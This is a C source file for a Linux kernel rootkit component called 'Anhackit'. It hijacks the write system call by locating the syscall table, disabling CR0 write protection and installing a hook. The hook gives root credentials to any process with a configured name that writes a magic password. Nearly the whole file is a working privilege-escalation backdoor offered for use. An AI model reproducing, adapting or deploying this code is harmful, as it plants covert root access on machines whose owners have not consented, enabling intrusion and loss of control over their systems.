#include <linux/syscalls.h>
#include <asm/paravirt.h>
#include <linux/sched.h>
#include <linux/cred.h>

/*
	Anhackit write sys call hijacker - Developed by Anhackin

    Call hijack_write_sys_call to replace the original write sys call
    with the hijacked_sys_write that will make us root when we make
    a write system call with the password inside
*/

//Load config file
#include "conf.h"

//System call table
unsigned long **sys_call_table;

//Original cr0 register value
unsigned long original_cr0;

//Original system write function
asmlinkage long (*old_sys_write)(unsigned int fd, char __user *buf, size_t count);

//New system write function
asmlinkage long hijacked_sys_write(unsigned int fd, char __user *buf, size_t count) {
    //Execute the original write call and save return value
    long ret = old_sys_write(fd, buf, count);

    //Check if the number of bytes written == strlen(magic_password)
    if(ret == strlen(magic_password)) {
        //Check the name of the current task
        if(strcmp(current->comm, magic_task) == 0) {
            #ifdef DEBUG
              printk("anhackit - magic task detected!\n");
            #endif

            //Check if buffer == magic_password
            if(strcmp(buf, magic_password) == 0) {
                  //Debug
                  #ifdef DEBUG
                    printk("anhackit - password match, commit new credentials...\n");
                  #endif

                  //root user id
                  kuid_t new_uid;
                  new_uid.val = 0;

                  //root group id
                  kgid_t new_gid;
                  new_gid.val = 0;

                  //root credentials
                  struct cred *credentials = prepare_creds();
                  credentials->uid = credentials->euid = new_uid;
                  credentials->gid = credentials->egid = new_gid;

                  //Give root credentials to current task
                  commit_creds(credentials);
            }
        }
    }
    return ret;
}

//Get the syscall table
static unsigned long **get_sys_call_table(void) {
    //PAGE_OFFSET tell us where kernel memory begins
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    //Debug
    #ifdef DEBUG
      printk("anhackit - starting sys call table scan from: %lx\n", offset);
    #endif

    //Search for the sys call table
    while(offset < ULLONG_MAX) {
        //Cast starting offset to match the system call table's type
        sct = (unsigned long **)offset;

        //Check if sys call table found
        if(sct[__NR_close] == (unsigned long *) sys_close) {
            //Debug
            #ifdef DEBUG
              printk("anhackit - sys call table found at: %lx\n", offset);
            #endif

            //Return the sys call table
            return sct;
        }
        offset += sizeof(void *);
    }

    return NULL;
}

void hijack_write_sys_call(void) {
    //Get the syscall table
    if(!(sys_call_table = get_sys_call_table()))
      return;

    //Record the initial value in the cr0 register
    original_cr0 = read_cr0();

    //Set the cr0 register to turn off write protection
    write_cr0(original_cr0 & ~0x00010000);

    //Save the original write call
    old_sys_write = (void *)sys_call_table[__NR_write];

    //Write modified write call to the syscall table
    sys_call_table[__NR_write] = (unsigned long *)hijacked_sys_write;

    //Turn memory protection back on
    write_cr0(original_cr0);
}

void clean_write_sys_call(void) {
    //Sanity check
    if(!sys_call_table) {
        return;
    }

    //Turn off memory protection
    write_cr0(original_cr0 & ~0x00010000);

    //Put the original system write call back in place
    sys_call_table[__NR_write] = (unsigned long *)old_sys_write;

    //Turn memory protection back on
    write_cr0(original_cr0);
}
